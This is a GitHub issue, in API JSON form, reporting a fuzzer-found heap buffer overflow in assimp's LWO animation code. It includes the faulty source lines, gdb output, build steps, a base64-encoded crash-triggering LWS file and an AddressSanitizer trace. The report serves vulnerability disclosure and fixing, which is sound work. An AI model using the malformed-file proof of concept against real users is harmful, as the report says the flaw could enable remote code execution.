{"url":"https://api.github.com/repos/assimp/assimp/issues/6023","repository_url":"https://api.github.com/repos/assimp/assimp","labels_url":"https://api.github.com/repos/assimp/assimp/issues/6023/labels{/name}","comments_url":"https://api.github.com/repos/assimp/assimp/issues/6023/comments","events_url":"https://api.github.com/repos/assimp/assimp/issues/6023/events","html_url":"https://github.com/assimp/assimp/issues/6023","id":2877381000,"node_id":"I_kwDOAAnkjM6rgVmI","number":6023,"title":"Bug: Heap-based Buffer Overflow in Assimp::LWO::AnimResolver::UpdateAnimRangeSetup","user":{"login":"d3ng03","id":110011460,"node_id":"U_kgDOBo6kRA","avatar_url":"https://avatars.githubusercontent.com/u/110011460?v=4","gravatar_id":"","url":"https://api.github.com/users/d3ng03","html_url":"https://github.com/d3ng03","followers_url":"https://api.github.com/users/d3ng03/followers","following_url":"https://api.github.com/users/d3ng03/following{/other_user}","gists_url":"https://api.github.com/users/d3ng03/gists{/gist_id}","starred_url":"https://api.github.com/users/d3ng03/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/d3ng03/subscriptions","organizations_url":"https://api.github.com/users/d3ng03/orgs","repos_url":"https://api.github.com/users/d3ng03/repos","events_url":"https://api.github.com/users/d3ng03/events{/privacy}","received_events_url":"https://api.github.com/users/d3ng03/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":244436167,"node_id":"MDU6TGFiZWwyNDQ0MzYxNjc=","url":"https://api.github.com/repos/assimp/assimp/labels/Bug","name":"Bug","color":"bfe5bf","default":false,"description":"Global flag to mark a deviation from expected behaviour"},{"id":1804450557,"node_id":"MDU6TGFiZWwxODA0NDUwNTU3","url":"https://api.github.com/repos/assimp/assimp/labels/LWO","name":"LWO","color":"e99695","default":false,"description":"Bugs related to the LWO format"},{"id":2238868387,"node_id":"MDU6TGFiZWwyMjM4ODY4Mzg3","url":"https://api.github.com/repos/assimp/assimp/labels/Fuzzer","name":"Fuzzer","color":"c5def5","default":false,"description":"Bugs found by a fuzzer"},{"id":8287495077,"node_id":"LA_kwDOAAnkjM8AAAAB7fkjpQ","url":"https://api.github.com/repos/assimp/assimp/labels/Security%20Risk","name":"Security Risk","color":"bfd4f2","default":false,"description":"Bugs that could potentially be security vulnerabilities"}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":3,"created_at":"2025-02-25T07:33:42Z","updated_at":"2025-06-08T12:02:05Z","closed_at":"2025-05-01T20:57:13Z","author_association":"NONE","type":{"id":101701,"node_id":"IT_kwDOAAQNPc4AAY1F","name":"Bug","description":"An unexpected problem or behavior","color":"red","created_at":"2024-01-25T09:11:49Z","updated_at":"2024-07-26T10:05:04Z","is_enabled":true},"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Summary\n\nheap buffer overflow in `Assimp::LWO::AnimResolver::UpdateAnimRangeSetup`. An attacker could potentially exploit the vulnerability to cause a remote code execution, if they can trick the victim into running assimp on a malformed LWO file.\n\n### Affected\n\nassimp>=5.4.3\n\n### Details\n\nIn `code/AssetLib/LWO/LWOAnimation.cpp:210` , `n` is reading out of bound variable than allocated `it (Assimp::LWO::Key)`, which caused heap buffer overflow.\n\n```cpp\n// code/AssetLib/LWO/LWOAnimation.cpp:210\nn = (*it).keys.end() - (old_size + 1);\n\n// code/AssetLib/LWO/LWOAnimation.cpp:213\nfor (const double tmp = delta * (num + 1); cur_minus <= tmp; cur_minus += delta, ++tt) {\n    m = (delta == tmp ? (*it).keys.begin() : n - (old_size + 1));\n    for (; m != n; --n) {\n        (*n).time -= cur_minus;\n```\n\n```bash\ngdb-peda$ p (*it)\n$16 = (Assimp::LWO::Envelope &) @0x6070000010d0: {\n  index = 0x0,\n  type = Assimp::LWO::EnvelopeType_Position_X,\n  pre = Assimp::LWO::PrePostBehaviour_OffsetRepeat,\n  post = Assimp::LWO::PrePostBehaviour_Reset,\n  keys = std::vector of length 2, capacity 2 = {{\n      time = 200,\n      value = 8,\n      inter = Assimp::LWO::IT_LINE,\n      params = {0, 0, 0, 0, 0}\n    }, {\n      time = 550,\n      value = 22,\n      inter = Assimp::LWO::IT_LINE,\n      params = {0, 0, 0, 0, 0}\n    }},\n  old_first = 0x0,\n  old_last = 0x1\n}\ngdb-peda$ p *n\n$17 = (Assimp::LWO::Key &) @0x607000001108: {\n  time = 0,\n  value = -62544612,\n  inter = 3429799609,\n  params = {6.14329247e-42, 3.45952565e-41, 6.10125351e-42, 1.12103877e-43, 6.85234949e-43}\n}\ngdb-peda$ p &(*n).time\n$18 = (double *) 0x607000001108\n\ngdb-peda$ p/x 0x607000001108 - 0x6070000010d0\n$19 = 0x38\ngdb-peda$ p sizeof(Assimp::LWO::Envelope)\n$20 = 0x38\n```\n\n### PoC\n\n1. build assimp with sanitizer\n\n```bash\ngit clone https://github.com/assimp/assimp.git && cd assimp\n\ncmake CMakeLists.txt -G \"Ninja\" -DBUILD_SHARED_LIBS=OFF -DASSIMP_BUILD_ZLIB=ON \\\n                    -DASSIMP_BUILD_TESTS=OFF -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \\\n                    -DASSIMP_BUILD_SAMPLES=OFF\ncmake --build .\n\nclang -fsanitize=address,fuzzer -std=c++11 -Iinclude fuzz/assimp_fuzzer.cc -o assimp_fuzzer ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a\n```\n\n1. run fuzzer to trigger bug\n\n```bash\necho \"TFdTQyBfX18kOzIKIDINOCRBJA0oTG9hCQkJCQkJICA3Mw04IDggATIgNzMNOGWRXDBTJSAxDG9u\nICQNIDZvYWENjw1uQ2U7dGlvbg0NDUFkZENhbWVyYQ2cnJycnJycnJycm01vdGlv/w0NDQ0PDTAN\nMDENUGlfX3BvbkNlLw0NDVByZS9Qb3N0QmVoYXZpb3INTGlnaHRDb25lQW5nbGUNDUxpZ2h0TW90\naW9uDQ0NMgogMg04IFAzCSQ2JF90TQoyMiAJIDIgNzMNDQ0wdE1vdGlvbkhISEhISEhISEhISEgJ\nCQl5eXl5b2xvcgovLwogOGMvDQ0NUHJlL1Bvc3RCZWhhdmlvciA0VmFyAWlvbpcAU0NlcnMgCWlv\nDG1lc2gMKzUgZWVlZWFkAP9vbm4gND8/Pz8jPz8JCSAwIDczDTggNyAgIDM/eXl5eWwNjw0fIDAw\nDTAxJCQ7X19fdFBvaW50IA0NDQ1QaXZvbQogOGMvDQ0NUHJlL1Bvc3RCZWhhdmlvciA3MwkJIDAg\nN2VBbmdsZQ0NYWdpYy8NDQ1QcmV/////dEJlaGF2aW9yDUxpZ2h0Q29uCQkJeXl5eW9sb3IKLy8K\nIDhjLw0NDVByZS9Qb3N0QmVoYXZpb3IgNzMJCSAwIDdlQW5nbGUNDUxpZ2h0TV50aW9uDQ0NMgog\nfJxyDQ1MDUxvYWRPYmplY3QgJCQkX19fbWFnaWNfX18kJCQgDUxvYWRPYmplY3QgJCQkX19fbWFn\naWNfX18kJCQgHjFlWlFNhXYgMU0PDXJhDZycnJycnJycnG9uMwkJDQ0eCzEkTW8QaW/+////5P//\nP3NvbGlkDQ00CiANDQ0wX19fX18kOzIKIDLyOAYBMkEkQSQNKExvYQkJCQkJCSAgNzMNOCBYIAEy\nIDczDThlkVwwUyUgMQxvbiAkDSA2b2FhDY8NMDssJF9fcG9uQ2V2jWFtZXJhDZycnJxyDQ1MDUxv\nYWRPYmplY3QgJCQkX188P3htaWNfX18kJCQgHjFlY1FNMXYgMX8PDTA7dAEAbg0NDUFkZENhkmVy\nYQ2cnJycnJycnJycm01vdGlv\" | base64 -d > crash\n\n./assimp_fuzzer ./crash\n```\n\n### Sanitizer Report\n\n```bash\n=================================================================\n==934805==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x607000001108 at pc 0x56359bd17db3 bp 0x7fff51ca2370 sp 0x7fff51ca2368\nREAD of size 8 at 0x607000001108 thread T0\n    #0 0x56359bd17db2 in Assimp::LWO::AnimResolver::UpdateAnimRangeSetup() /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWO/LWOAnimation.cpp:216:31\n    #1 0x56359b03dfe5 in Assimp::LWO::AnimResolver::SetAnimationRange(double, double) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWO/LWOAnimation.h:252:9\n    #2 0x56359b034f75 in Assimp::LWSImporter::BuildGraph(aiNode*, Assimp::LWS::NodeDesc&, std::vector<Assimp::AttachmentInfo, std::allocator<Assimp::AttachmentInfo> >&, Assimp::BatchLoader&, aiCamera**&, aiLight**&, std::vector<aiNodeAnim*, std::allocator<aiNodeAnim*> >&) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWS/LWSLoader.cpp:438:18\n    #3 0x56359b03be91 in Assimp::LWSImporter::InternReadFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, aiScene*, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWS/LWSLoader.cpp:901:13\n    #4 0x56359abb7a12 in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/Common/BaseImporter.cpp:131:9\n    #5 0x56359a6327e4 in Assimp::Importer::ReadFile(char const*, unsigned int) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:709:30\n    #6 0x56359a6300a2 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:507:9\n    #7 0x56359a62b717 in LLVMFuzzerTestOneInput (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x491717) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #8 0x56359a554203 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3ba203) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #9 0x56359a53df7f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a3f7f) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #10 0x56359a543cd6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a9cd6) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #11 0x56359a56daf2 in main (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3d3af2) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #12 0x7f04aa11dd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #13 0x7f04aa11de3f in __libc_start_main csu/../csu/libc-start.c:392:3\n    #14 0x56359a538844 in _start (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x39e844) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n\n0x607000001108 is located 0 bytes to the right of 72-byte region [0x6070000010c0,0x607000001108)\nallocated by thread T0 here:\n    #0 0x56359a5f087e in malloc (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x45687e) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #1 0x7f04aa4d298b in operator new(unsigned long) (/lib/x86_64-linux-gnu/libstdc++.so.6+0xae98b) (BuildId: e37fe1a879783838de78cbc8c80621fa685d58a2)\n    #2 0x56359b041b40 in std::allocator_traits<std::allocator<std::_List_node<Assimp::LWO::Envelope> > >::allocate(std::allocator<std::_List_node<Assimp::LWO::Envelope> >&, unsigned long) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/alloc_traits.h:464:20\n    #3 0x56359b041939 in std::__cxx11::_List_base<Assimp::LWO::Envelope, std::allocator<Assimp::LWO::Envelope> >::_M_get_node() /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_list.h:443:16\n    #4 0x56359b0417f0 in std::_List_node<Assimp::LWO::Envelope>* std::__cxx11::list<Assimp::LWO::Envelope, std::allocator<Assimp::LWO::Envelope> >::_M_create_node<>() /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_list.h:635:21\n    #5 0x56359b04167d in void std::__cxx11::list<Assimp::LWO::Envelope, std::allocator<Assimp::LWO::Envelope> >::_M_insert<>(std::_List_iterator<Assimp::LWO::Envelope>) /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_list.h:1912:18\n    #6 0x56359b03da96 in Assimp::LWO::Envelope& std::__cxx11::list<Assimp::LWO::Envelope, std::allocator<Assimp::LWO::Envelope> >::emplace_back<>() /usr/bin/../lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/stl_list.h:1228:10\n    #7 0x56359b03215b in Assimp::LWSImporter::ReadEnvelope_Old(std::_List_const_iterator<Assimp::LWS::Element>&, std::_List_const_iterator<Assimp::LWS::Element> const&, Assimp::LWS::NodeDesc&, unsigned int) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWS/LWSLoader.cpp:267:24\n    #8 0x56359b039100 in Assimp::LWSImporter::InternReadFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, aiScene*, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWS/LWSLoader.cpp:686:17\n    #9 0x56359abb7a12 in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/Common/BaseImporter.cpp:131:9\n    #10 0x56359a6327e4 in Assimp::Importer::ReadFile(char const*, unsigned int) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:709:30\n    #11 0x56359a6300a2 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:507:9\n    #12 0x56359a62b717 in LLVMFuzzerTestOneInput (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x491717) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #13 0x56359a554203 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3ba203) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #14 0x56359a53df7f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a3f7f) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #15 0x56359a543cd6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a9cd6) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #16 0x56359a56daf2 in main (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3d3af2) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #17 0x7f04aa11dd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/LWO/LWOAnimation.cpp:216:31 in Assimp::LWO::AnimResolver::UpdateAnimRangeSetup()\nShadow bytes around the buggy address:\n  0x0c0e7fff81d0: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa\n  0x0c0e7fff81e0: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00\n  0x0c0e7fff81f0: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00\n  0x0c0e7fff8200: 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00\n  0x0c0e7fff8210: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00\n=>0x0c0e7fff8220: 00[fa]fa fa fa fa 00 00 00 00 00 00 00 00 00 00\n  0x0c0e7fff8230: fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa\n  0x0c0e7fff8240: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c0e7fff8250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c0e7fff8260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c0e7fff8270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==934805==ABORTING\n\n```\n\n---\n\n### Common weakness enumerator (CWE)\n\n- CWE-122: Heap-based Buffer Overflow\n- CWE-125: Out-of-bounds Read","closed_by":{"login":"kimkulling","id":2323156,"node_id":"MDQ6VXNlcjIzMjMxNTY=","avatar_url":"https://avatars.githubusercontent.com/u/2323156?v=4","gravatar_id":"","url":"https://api.github.com/users/kimkulling","html_url":"https://github.com/kimkulling","followers_url":"https://api.github.com/users/kimkulling/followers","following_url":"https://api.github.com/users/kimkulling/following{/other_user}","gists_url":"https://api.github.com/users/kimkulling/gists{/gist_id}","starred_url":"https://api.github.com/users/kimkulling/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/kimkulling/subscriptions","organizations_url":"https://api.github.com/users/kimkulling/orgs","repos_url":"https://api.github.com/users/kimkulling/repos","events_url":"https://api.github.com/users/kimkulling/events{/privacy}","received_events_url":"https://api.github.com/users/kimkulling/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/assimp/assimp/issues/6023/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/assimp/assimp/issues/6023/timeline","performed_via_github_app":null,"state_reason":"completed"}